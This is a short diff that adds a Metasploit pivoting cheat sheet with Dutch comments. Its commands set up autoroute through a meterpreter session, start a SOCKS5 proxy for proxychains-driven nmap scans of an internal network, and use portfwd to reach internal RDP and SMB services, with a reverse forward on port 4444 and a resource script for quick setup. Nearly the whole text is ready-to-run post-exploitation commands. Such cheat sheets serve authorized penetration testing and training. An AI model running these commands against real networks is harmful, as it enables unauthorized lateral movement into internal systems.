@@ -1,0 +1,41 @@
+# Metasploit Pivoting - autoroute + SOCKS proxy + portfwd
+# === Autoroute (route traffic via meterpreter sessie) ===
+# Vanuit msfconsole:
+use multi/manage/autoroute
+set SESSION 1
+set SUBNET INTERNAL_SUBNET
+set NETMASK 255.255.255.0
+exploit
+# Of handmatig:
+route add INTERNAL_SUBNET/24 SESSION_ID
+route print
+# === SOCKS proxy (voor externe tools via proxychains) ===
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+exploit -j
+# Proxychains config: socks5 127.0.0.1 1080
+# Gebruik: proxychains nmap -sT -Pn INTERNAL_TARGET
+# === Meterpreter portfwd (specifieke poorten) ===
+# Local port forward:
+meterpreter > portfwd add -l 3389 -p 3389 -r INTERNAL_TARGET
+# Verbind: rdesktop 127.0.0.1:3389
+# SMB forward:
+meterpreter > portfwd add -l 445 -p 445 -r INTERNAL_TARGET
+# Reverse port forward:
+meterpreter > portfwd add -R -l 4444 -p 4444 -L 0.0.0.0
+# Lijst:
+meterpreter > portfwd list
+# Verwijder:
+meterpreter > portfwd delete -l 3389 -p 3389 -r INTERNAL_TARGET
+# === Resource script voor snelle setup ===
+# pivot.rc:
+# use multi/manage/autoroute
+# set SESSION 1
+# exploit
+# use auxiliary/server/socks_proxy
+# set SRVHOST 127.0.0.1
+# exploit -j
+# msfconsole -r pivot.rc
+# Tip: autoroute + socks_proxy = scan heel intern netwerk via proxychains
